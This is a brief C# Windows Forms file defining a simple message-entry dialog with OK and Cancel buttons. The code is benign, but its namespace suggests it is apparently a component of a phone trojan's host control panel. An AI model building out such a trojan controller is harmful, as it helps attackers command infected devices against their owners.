using System;
using System.Windows.Forms;

namespace IIE.Phone.Troj.Host.Panel
{
    public partial class SendMessageFrm : Form
    {

        public string Message{get { return tbMessage.Text; }}

        public SendMessageFrm()
        {
            InitializeComponent();
            DialogResult = DialogResult.Cancel;
        }

        private void btnOk_Click(object sender, EventArgs e)
        {
            if (!string.IsNullOrEmpty(Message))
            {
                DialogResult = DialogResult.OK;
                Close();
            }
        }

        private void btnCancel_Click(object sender, EventArgs e)
        {
            Close();
        }
    }
}
